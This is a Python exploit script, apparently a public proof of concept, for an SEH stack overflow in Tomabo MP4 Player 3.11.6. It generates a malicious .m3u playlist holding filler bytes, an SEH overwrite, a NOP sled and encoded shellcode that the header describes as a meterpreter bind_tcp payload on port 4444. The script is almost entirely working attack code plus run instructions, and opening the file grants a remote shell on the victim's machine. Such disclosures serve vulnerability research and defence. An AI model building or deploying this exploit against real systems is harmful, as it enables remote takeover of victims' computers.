#!/usr/bin/python

#####################################################################
# Exploit Title: Tomabo MP4 Player 3.11.6 SEH Based Stack Overflow  #
# Exploit Author: @yokoacc, @nudragn, @rungga_reksya                #
# Vendor Homepage: http://www.tomabo.com/                           #
# Software Link: http://www.tomabo.com/mp4-player/download.html     #
# Vulnerable App: Attached                                          #
# Version: 3.11.6 (possibility <= 3.11.6)                           #
# Tested on: Windows XP, 7, 8, and 8.1                              #
# Special Thanks to: @OffsecTraining                                #
# Vendor Notification: August 30th, 2015                            #
# Fixed Date: Around September 16th, 2015 (didn't response yet)     #
# Public Disclosure: October 18th, 2015                             #
#####################################################################

# How to: Run the code and open the m3u file with the Vulnerable MP4 Player by Tomabo
# Bad Character = '\x00\x09\x0a\x0b\x0c\x0d\x1a\x20'
# Payload= windows/meterpreter/bind_tcp ; PORT=4444

file ="whatever.m3u"

load = "\x41" * 1028
load += "\xeb\x08\x90\x90"
load += "\xA9\x1C\x40\x00"
load += "\x90" * 16
load += ("\xdb\xde\xbd\xbc\x9e\x98\xd8\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x48\x31\x6f\x18\x03\x6f\x18\x83\xef\x40\x7c\x6d\x24\x50\x03"
"\x8e\xd5\xa0\x64\x06\x30\x91\xa4\x7c\x30\x81\x14\xf6\x14\x2d"
"\xde\x5a\x8d\xa6\x92\x72\xa2\x0f\x18\xa5\x8d\x90\x31\x95\x8c"
"\x12\x48\xca\x6e\x2b\x83\x1f\x6e\x6c\xfe\xd2\x22\x25\x74\x40"
"\xd3\x42\xc0\x59\x58\x18\xc4\xd9\xbd\xe8\xe7\xc8\x13\x63\xbe"
"\xca\x92\xa0\xca\x42\x8d\xa5\xf7\x1d\x26\x1d\x83\x9f\xee\x6c"
"\x6c\x33\xcf\x41\x9f\x4d\x17\x65\x40\x38\x61\x96\xfd\x3b\xb6"
"\xe5\xd9\xce\x2d\x4d\xa9\x69\x8a\x6c\x7e\xef\x59\x62\xcb\x7b"
"\x05\x66\xca\xa8\x3d\x92\x47\x4f\x92\x13\x13\x74\x36\x78\xc7"
"\x15\x6f\x24\xa6\x2a\x6f\x87\x17\x8f\xfb\x25\x43\xa2\xa1\x21"
"\xa0\x8f\x59\xb1\xae\x98\x2a\x83\x71\x33\xa5\xaf\xfa\x9d\x32"
"\xd0\xd0\x5a\xac\x2f\xdb\x9a\xe4\xeb\x8f\xca\x9e\xda\xaf\x80"
"\x5e\xe3\x65\x3c\x57\x42\xd6\x23\x9a\x34\x86\xe3\x35\xdc\xcc"
"\xeb\x6a\xfc\xee\x21\x03\x94\x12\xca\x3d\x38\x9a\x2c\x57\xd0"
"\xca\xe7\xc0\x12\x29\x30\x76\x6d\x1b\x68\x10\x26\x4d\xaf\x1f"
"\xb7\x5b\x87\xb7\x33\x88\x13\xa9\x44\x85\x33\xbe\xd2\x53\xd2"
"\x8d\x43\x63\xff\x64\x83\xf1\x04\x2f\xd4\x6d\x07\x16\x12\x32"
"\xf8\x7d\x29\xfb\x6c\x3e\x45\x04\x61\xbe\x95\x52\xeb\xbe\xfd"
"\x02\x4f\xed\x18\x4d\x5a\x81\xb1\xd8\x65\xf0\x66\x4a\x0e\xfe"
"\x51\xbc\x91\x01\xb4\x3c\xed\xd7\xf0\x4a\x1f\xe4")

load += "\x44" * (1800 - len(load))

writeFile = open (file, "w")
writeFile.write(load)
writeFile.close()